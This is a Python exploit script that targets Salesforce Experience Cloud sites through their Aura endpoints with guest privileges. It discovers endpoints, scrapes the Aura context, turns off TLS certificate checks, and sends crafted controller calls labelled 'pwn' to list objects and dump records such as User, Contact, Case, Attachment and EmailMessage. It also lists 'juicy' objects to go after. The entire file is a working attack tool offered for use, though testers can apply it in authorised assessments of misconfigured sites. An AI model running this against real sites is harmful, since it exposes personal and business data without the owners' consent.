import urllib.request
import urllib.parse
from urllib.error import URLError, HTTPError
import json
from json import JSONDecodeError
import argparse
import re
import os
import sys
import ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AURA_PATH_PATTERN = ("aura", "s/aura", "s/sfsites/aura", "sfsites/aura")
PAYLOAD_PULL_CUSTOM_OBJ = '{"actions":[{"id":"pwn","descriptor":"serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData","callingDescriptor":"UNKNOWN","params":{}}]}'

SF_OBJECT_NAME = ('Case', 'Account', 'User', 'Contact', 'Document', 'ContentDocument', 'ContentVersion', 'ContentBody', 'CaseComment', 'Note', 'Employee', 'Attachment', 'EmailMessage', 'CaseExternalDocument', 'Attachment', 'Lead', 'Name', 'EmailTemplate', 'EmailMessageRelation')

DEFAULT_PAGE_SIZE = 100
MAX_PAGE_SIZE = 1000
DEFAULT_PAGE = 1

USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36'
TAB = "  "


def http_request(url, values='', method='GET'):
    headers = {
        'User-Agent': USER_AGENT
    }
    if method == 'POST':
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        data = urllib.parse.urlencode(values)
        data = data.encode('ascii')
        request = urllib.request.Request(url, data=data, method=method, headers=headers)
    else:
        request = urllib.request.Request(url, method=method, headers=headers)
        
    response_body = ''
    try:
        with urllib.request.urlopen(request, context=ctx) as response:
            response_body = response.read().decode("utf-8")
    except URLError as e:
        raise
    return response_body


def check(url):
    print("[*] Enumerating aura endpoints")
    method = "POST"
    obj = {} 
    json_data = json.dumps(obj).encode("utf-8")
    aura_endpoints = []
    for path in AURA_PATH_PATTERN:
        tmp_aura_endpoint = urllib.parse.urljoin(url, path)

        try:
            response_body = http_request(tmp_aura_endpoint, values={}, method='POST')
        except HTTPError as e:
            response_body = e.read().decode("utf-8")

        if "aura:invalidSession" in response_body:
            print(f"{TAB}[+] Found {tmp_aura_endpoint}")
            aura_endpoints.append(tmp_aura_endpoint)
    
    return aura_endpoints


def get_aura_context(url):
    
    response_body = ''
    try:
        response_body = http_request(url)
    except Exception as e:
        print("[-] Failed to access the url")
        raise

    if ("window.location.href ='%s" % url) in response_body:
        location_url = re.search(r'window.location.href =\'([^\']+)', response_body)
        url = location_url.group(1)
        try:
            response_body = http_request(url)
        except Exception as e:
            print("[-] Failed to access the redirect url")
            raise

    aura_encoded = re.search(r'\/s\/sfsites\/l\/([^\/]+fwuid[^\/]+)', response_body)
    
    if aura_encoded is not None:
        response_body = urllib.parse.unquote(aura_encoded.group(1))
    fwuid = re.search(r'"fwuid":"([^"]+)', response_body)
    markup = re.search(r'"(APPLICATION@markup[^"]+)":"([^"]+)"', response_body)
    app = re.search(r'"app":"([^"]+)', response_body)

    if fwuid is None or markup is None or app is None:
        raise Exception("Couldn't find fwuid or markup")
    
    aura_context = '{"mode":"PROD","fwuid":"' + fwuid.group(1)
    aura_context += '","app":"' + app.group(1) + '","loaded":{"' + markup.group(1) 
    aura_context += '":"' + markup.group(2) + '"},"dn":[],"globals":{},"uad":false}'

    return aura_context


def create_payload_for_getItems(object_name, page_size, page):
    payload = '{"actions":[{"id":"pwn","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"'
    payload += object_name
    payload += '","layoutType":"FULL",'
    payload += '"pageSize":%s' % page_size
    payload += ',"currentPage":%s' % page
    payload += ',"useTimeout":false,"getCount":true,"enableRowActions":false}}]}'
    return payload


def create_payload_for_getRecord(recode_id):
    payload = '{"actions":[{"id":"pwn","descriptor":"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"'
    payload += recode_id
    payload += '","record":null,"inContextOfComponent":"","mode":"VIEW","layoutType":"FULL","defaultFieldValues":null,"navigationLocation":"LIST_VIEW_ROW"}}]}'
    return payload


def exploit(aura_endpoint, payload, aura_context):
    url = aura_endpoint + '?r=1&applauncher.LoginForm.getLoginRightFrameUrl=1'
        
    values = {
        'message': payload,
        'aura.context': aura_context,
        'aura.token': 'undefined'
    }

    try:
        response_body = http_request(url, values=values, method='POST')
        response_json = json.loads(response_body)
    except JSONDecodeError as je:
        raise Exception("JSON Decode error. Response -> %s" % response_body)
    except Exception as e:
        raise e

    return response_json 


def pull_object_list(aura_endpoint, aura_context):
    print("[+] Pulling list of accessible objects")
    sf_all_object_name_list = []
    try:
        response = exploit(aura_endpoint, PAYLOAD_PULL_CUSTOM_OBJ, aura_context)

        if response.get('exceptionEvent') is not None and response.get('exceptionEvent') is True:
            raise Exception(response)

        if response.get('actions') is None or response.get('actions')[0].get('state') is None:
            raise Exception("Failed to get actions: %s" % response)

        SF_OBJECT_NAME_dict = response.get("actions")[0].get("returnValue").get("apiNamesToKeyPrefixes")

        SF_OBJECT_NAME_list = [key for key in SF_OBJECT_NAME_dict.keys() if not key.endswith("__c")]
        sf_custom_object_name = [key for key in SF_OBJECT_NAME_dict.keys() if key.endswith("__c")]
        sf_all_object_name_list = [key for key in SF_OBJECT_NAME_dict.keys()]
        
    except Exception as e:
        print("[-] Failed to pull the object list")
        print("[-] Error: %s" % e)
        
    else:
        print("[+] Default objects found:")
        for obj in SF_OBJECT_NAME_list:
            print(f"{TAB}[+] {obj}")
        print()
        print("[+] Custom objects found:")
        for obj in sf_custom_object_name:
            print(f"{TAB}[+] {obj}")
        print()
    return sf_all_object_name_list    

def dump_object(aura_endpoint, aura_context, object_name, page_size=DEFAULT_PAGE_SIZE, page=DEFAULT_PAGE):
    print(f"[+] Getting \"{object_name}\" object (page number {page})...")
    payload = create_payload_for_getItems(object_name, page_size, page)

    try:
        response = exploit(aura_endpoint, payload, aura_context)

        if response.get('exceptionEvent') is not None and response.get('exceptionEvent') is True:
            raise Exception(response)

    except Exception as e:
        print("[-] Failed to exploit.")
        print("[-] Error: %s" % e)
        return None

    try:
        actions = response.get('actions')[0]
        state = response.get('actions')[0].get('state')
    except:
        return None

    return_value = actions.get('returnValue')
    try:
        total_count = return_value.get('totalCount')    
        result_count = return_value.get('result')
    except:
        total_count = "0"
        result_count = []
    print(f"[+] State: {state}, Total: {total_count}, Page: {page}, Result count: {len(result_count)}")
    if state == "ERROR":
        print(f"[+] Error message: {actions.get('error')[0]}")
        return None

    return_value = response.get('actions')[0].get('returnValue')
    print("[+] Results: " )
    # print(f"{TAB}{json.dumps(return_value, ensure_ascii=False, indent=2)}\n")
    return response


def dump_and_save_objects(aura_endpoint, aura_context):
    sf_all_object_name_list = pull_object_list(aura_endpoint, aura_context)

    page_size = MAX_PAGE_SIZE

    failed_objects = []

    for object_name in sf_all_object_name_list:
        if object_name != "User":
            continue
        page = DEFAULT_PAGE
        while True:
            response = dump_object(aura_endpoint, aura_context, object_name, page_size, page)
            if response is None:
                failed_objects.append(object_name)
                break
            return_value = response.get('actions')[0].get('returnValue')
            page += 1
            if return_value is None or return_value.get('result') is None:
                break
            if len(return_value.get('result')) < page_size :
                break

    if len(failed_objects) > 0:
        print("[-] Failed to dump the following objects (please retry with the -o option to attempt to manually dump each of them):")
        for obj in failed_objects:
            print(f"{TAB}[-] {obj}")

    
def init():
    parser = argparse.ArgumentParser(description='Exploit Salesforce through the aura endpoint with the guest privilege')
    parser.add_argument('-u', '--url', required=True, help='set the SITE url. e.g. http://url/site_path')
    parser.add_argument('-o', '--objects', 
        help='set the object name. Default value is "User" object. Juicy Objects: %s' % ",".join(SF_OBJECT_NAME), 
        nargs='*', default=['User'])
    parser.add_argument('-l', '--listobj', help='pull the object list.', action='store_true')
    parser.add_argument('-c', '--check', help='only check aura endpoint', action='store_true')
    parser.add_argument('-a', '--aura_context', help='set your valid aura_context')
    parser.add_argument('-d', '--dump_objects', help='dump a small number of objects accessible to guest users and saves them in the file.', action='store_true')
    parser.add_argument('-m', '--mass_collect', help='if set with -d, fetches objects from all discovered aura URLs.', action='store_true')

    args = parser.parse_args()

    return args
    

if __name__ == "__main__":
    args = init()
    aura_endpoints = check(args.url)

    if len(aura_endpoints) == 0:
        print("[-] No aura endpoints found")
        sys.exit(0)

    if args.check:        
        sys.exit(0)

    if args.aura_context is not None and len(args.aura_context) > 1:
        aura_context = args.aura_context
    else:
        try:
            aura_context = get_aura_context(args.url)
        except Exception as e:
            print("[-] Failed to get aura context.")
            sys.exit(0)

    for aura_endpoint in aura_endpoints:
        print(f"[*] Working with endpoint {aura_endpoint}")

        if args.listobj:
            sf_all_object_name_list = pull_object_list(aura_endpoint, aura_context)

        elif args.dump_objects:
            dump_and_save_objects(aura_endpoint, aura_context)

        elif args.objects:
            for object_name in args.objects:
                dump_object(aura_endpoint, aura_context, object_name)

        if not args.mass_collect:
            break